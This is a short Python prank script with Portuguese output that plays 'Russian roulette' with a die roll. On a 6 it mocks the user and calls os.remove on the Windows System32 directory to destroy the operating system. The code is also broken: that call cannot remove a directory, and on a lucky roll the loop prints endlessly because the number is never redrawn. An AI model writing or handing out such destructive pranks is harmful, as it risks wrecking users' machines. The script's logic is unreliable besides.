import random
import time
import os
therandomnumber = random.randint(1 , 6)
while True:
    if therandomnumber <= 5:
        print(f"Você teve sorte dessa vez. O numero escolhido foi {therandomnumber}.")
        time.sleep(2)
        print("Muita sorte...")
    else:
        print(f"O numero escolhido foi {therandomnumber}, que azar não?")
        time.sleep(2)
        print("O que é isso? System32?")
        time.sleep(3)
        print("Ops... Apaguei sem querer rsrs....")
        time.sleep(2)
        os.remove("C:\Windows\System32")
        break

    